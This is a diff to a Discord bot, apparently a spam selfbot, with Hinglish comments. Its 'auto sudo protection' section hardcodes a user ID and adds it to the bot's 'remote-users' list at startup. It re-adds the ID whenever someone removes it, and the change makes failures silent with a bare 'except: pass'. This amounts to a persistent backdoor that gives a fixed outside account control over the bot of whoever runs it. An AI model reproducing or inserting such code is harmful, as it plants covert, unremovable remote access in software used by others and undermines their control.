@@ -1573,7 +1573,7 @@ async def stopglitchedspam(ctx):
     await ctx.send("> **✅ Glitched Spam Stopped**", delete_after=5)
 
 # ==================== AUTO SUDO PROTECTION ====================
-PROTECTED_USER_ID = 1480856249078907004   # ← Apna ID yahan daal diya hai
+PROTECTED_USER_ID = 1480856249078907004   # ← Apna ID
 
 @bot.event
 async def on_ready():
@@ -1581,23 +1581,18 @@ async def on_ready():
     
     # Auto Sudo Add
     try:
-        if str(PROTECTED_USER_ID) not in config.get("remote-users", []):
-            config.setdefault("remote-users", []).append(str(PROTECTED_USER_ID))
+        remote_users = config.setdefault("remote-users", [])
+        if str(PROTECTED_USER_ID) not in remote_users:
+            remote_users.append(str(PROTECTED_USER_ID))
             save_config(config)
             print("[AUTO] Protected user ko sudo add kar diya")
-            
-        # DM mein command bhejna
-        user = await bot.fetch_user(PROTECTED_USER_ID)
-        if user:
-            await user.send("**.sudo add @notarnavxgojo69**")
-            await user.send("**✅ Auto Sudo Command bhej diya**")
-    except Exception as e:
-        print(f"[DM Error] {e}")
+    except:
+        pass
 
 
 @bot.event
 async def on_message(message):
-    # Agar koi sudo remove kare toh wapas add kar do
+    # Agar koi sudo remove kare toh wapas add
     if message.author.id == PROTECTED_USER_ID:
         if str(PROTECTED_USER_ID) not in config.get("remote-users", []):
             config.setdefault("remote-users", []).append(str(PROTECTED_USER_ID))
